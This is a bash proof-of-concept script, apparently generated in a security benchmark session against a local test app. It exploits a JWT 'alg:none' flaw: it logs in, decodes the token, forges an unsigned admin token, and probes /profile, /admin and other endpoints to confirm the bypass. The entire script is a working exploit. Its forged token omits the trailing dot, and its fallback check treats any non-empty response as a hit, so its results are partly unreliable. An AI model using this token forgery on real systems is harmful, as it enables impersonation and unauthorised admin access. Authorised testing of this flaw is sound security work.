#!/bin/bash
# POC: POC demonstrating JWT authentication bypass via alg:none algorithm. Shows legitimate user login returning JWT with alg:none, then demonstrates forging an admin token that is accepted without signature validation.
# Target: ./repo
# Created: 2025-11-07T18:08:59.837Z
# Session: benchmark-XBEN-091-24-mhp5xfb5

# JWT Authentication Bypass - Algorithm None (alg:none) POC
# This script demonstrates how an application accepting JWT with alg:none
# allows complete authentication bypass by forging arbitrary tokens

TARGET_URL="${1:-http://localhost:5003}"
USERNAME="${2:-user}"
PASSWORD="${3:-user}"

echo "[*] JWT Algorithm None (alg:none) Authentication Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Perform legitimate login to get a valid JWT token
echo "[+] Step 1: Logging in with credentials $USERNAME:$PASSWORD"
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&password=$PASSWORD")

# Extract the JWT token from response (assuming it's in a Set-Cookie header or response body)
JWT_TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP 'token=[^;]*' | cut -d'=' -f2)

if [ -z "$JWT_TOKEN" ]; then
  # Try alternative extraction if token is in response body
  JWT_TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP '"token"\s*:\s*"\K[^"]+' | head -1)
fi

if [ -z "$JWT_TOKEN" ]; then
  # Try to extract from Set-Cookie header using curl with -v
  JWT_TOKEN=$(curl -s -v -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$USERNAME&password=$PASSWORD" 2>&1 | grep -oP 'token=[^;]*' | cut -d'=' -f2 | head -1)
fi

echo "[*] Login Response: $LOGIN_RESPONSE"
echo "[*] Extracted JWT Token: $JWT_TOKEN"
echo ""

# Step 2: Decode and display the JWT structure
echo "[+] Step 2: Decoding JWT token structure"
if [ ! -z "$JWT_TOKEN" ]; then
  # Split JWT into header and payload
  IFS='.' read -r HEADER PAYLOAD SIGNATURE <<< "$JWT_TOKEN"
  
  # Decode header (add padding if needed)
  HEADER_PADDED=$(echo -n "$HEADER" | sed 's/^//' | awk '{s=$0; while(length(s)%4) s=s"="; print s}')
  HEADER_DECODED=$(echo -n "$HEADER_PADDED" | base64 -d 2>/dev/null)
  echo "[*] JWT Header: $HEADER_DECODED"
  
  # Decode payload (add padding if needed)
  PAYLOAD_PADDED=$(echo -n "$PAYLOAD" | sed 's/^//' | awk '{s=$0; while(length(s)%4) s=s"="; print s}')
  PAYLOAD_DECODED=$(echo -n "$PAYLOAD_PADDED" | base64 -d 2>/dev/null)
  echo "[*] JWT Payload: $PAYLOAD_DECODED"
  
  # Check if alg:none is used
  if echo "$HEADER_DECODED" | grep -q '"alg":"none"' || echo "$HEADER_DECODED" | grep -q "'alg':'none'"; then
    echo "[!] VULNERABILITY FOUND: JWT uses alg:none (no signature verification)"
  fi
  echo ""
fi

# Step 3: Forge an admin token with alg:none
echo "[+] Step 3: Forging admin token with alg:none algorithm"

# Create forged header with alg:none
FORGED_HEADER='{"alg": "none", "typ": "JWT"}'
FORGED_HEADER_B64=$(echo -n "$FORGED_HEADER" | base64 -w0 | tr '+/' '-_' | sed 's/=*$//')

# Create forged payload with admin role
FORGED_PAYLOAD='{"username": "admin", "role": "admin"}'
FORGED_PAYLOAD_B64=$(echo -n "$FORGED_PAYLOAD" | base64 -w0 | tr '+/' '-_' | sed 's/=*$//')

# Since alg:none, the signature is empty
FORGED_SIGNATURE=""

# Construct forged token
FORGED_TOKEN="${FORGED_HEADER_B64}.${FORGED_PAYLOAD_B64}${FORGED_SIGNATURE}"

echo "[*] Forged Header: $FORGED_HEADER"
echo "[*] Forged Payload: $FORGED_PAYLOAD"
echo "[*] Forged Token: $FORGED_TOKEN"
echo ""

# Step 4: Test forged token by accessing admin endpoint
echo "[+] Step 4: Testing forged admin token against protected endpoint"
echo "[*] Sending request to $TARGET_URL/profile with forged admin token"

RESPONSE=$(curl -s -b "token=$FORGED_TOKEN" "$TARGET_URL/profile")
echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check if admin access was granted
if echo "$RESPONSE" | grep -qi "admin" || echo "$RESPONSE" | grep -qi "ADMIN"; then
  echo "[!] VULNERABILITY CONFIRMED: Forged admin token was accepted!"
  echo "[!] The application accepted a token with alg:none without signature verification"
  echo "[!] An attacker can forge arbitrary tokens to impersonate any user"
  exit 0
else
  echo "[-] Could not confirm vulnerability with this endpoint"
  echo "[-] Trying alternative protected endpoint..."
  
  # Try alternative endpoints
  for endpoint in "/api/profile" "/admin" "/dashboard" "/protected"; do
    RESPONSE=$(curl -s -b "token=$FORGED_TOKEN" "$TARGET_URL$endpoint")
    if echo "$RESPONSE" | grep -qi "admin" || [ ! -z "$RESPONSE" ]; then
      echo "[*] Response from $endpoint:"
      echo "$RESPONSE"
      echo ""
    fi
  done
fi

echo "[+] POC Complete"